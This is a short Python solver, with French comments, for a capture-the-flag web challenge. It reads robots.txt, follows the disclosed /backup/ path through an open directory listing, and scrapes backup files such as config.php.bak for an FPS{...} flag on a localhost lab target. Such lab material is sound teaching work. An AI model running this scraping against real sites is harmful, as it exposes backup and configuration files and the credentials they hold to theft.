#!/usr/bin/env python3
"""Solveur portail-stagiaire.

robots.txt revele /backup/ (confirme par un commentaire HTML sur l'accueil).
Le listing de repertoire est ouvert -> on lit config.php.bak -> flag.
"""
import re
import sys
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1341"


def get(path):
    return urllib.request.urlopen(BASE + path).read().decode(errors="replace")


def main():
    robots = get("/robots.txt")
    print("robots.txt:\n" + robots)
    assert "/backup/" in robots

    listing = get("/backup/")
    for name in re.findall(r'href="/backup/([^"]+)"', listing):
        body = get("/backup/" + name)
        m = re.search(r"FPS\{[^}]+\}", body)
        if m:
            print(m.group(0))
            return
    raise SystemExit("flag introuvable")


if __name__ == "__main__":
    main()
